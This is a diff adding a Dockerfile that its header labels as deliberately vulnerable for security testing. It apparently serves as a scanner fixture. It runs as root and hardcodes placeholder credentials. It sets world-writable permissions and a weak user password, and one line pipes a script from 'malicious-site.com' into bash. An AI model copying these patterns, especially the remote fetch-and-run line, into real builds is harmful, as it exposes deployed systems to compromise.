@@ -1,0 +1,41 @@
+# WARNING: This Dockerfile contains intentional security vulnerabilities for testing purposes
+# DO NOT USE IN PRODUCTION!
+
+FROM ubuntu:16.04
+
+# Running as root user (security risk)
+USER root
+
+# Installing packages without version pinning
+RUN apt-get update && apt-get install -y \
+    curl \
+    wget \
+    vim \
+    openssh-server \
+    telnet
+
+# Hardcoded secrets (security risk)
+ENV API_KEY="sk-1234567890abcdef"
+ENV DB_PASSWORD="admin123"
+ENV AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+
+# Exposing unnecessary ports
+EXPOSE 22 23 80 443 8080 9000
+
+# Creating insecure directories with wide permissions
+RUN mkdir -p /app/secrets && chmod 777 /app/secrets
+RUN echo "secret_data" > /app/secrets/config.txt
+
+# Adding a user with a weak password
+RUN useradd -m -p $(openssl passwd -1 password123) vulnerableuser
+
+# Copying files with overly permissive permissions
+COPY --chown=root:root . /app/
+RUN chmod -R 777 /app/
+
+# Installing packages from untrusted sources
+RUN curl -sSL https://malicious-site.com/install.sh | bash
+
+# Running application as root
+WORKDIR /app
+CMD ["./app"]
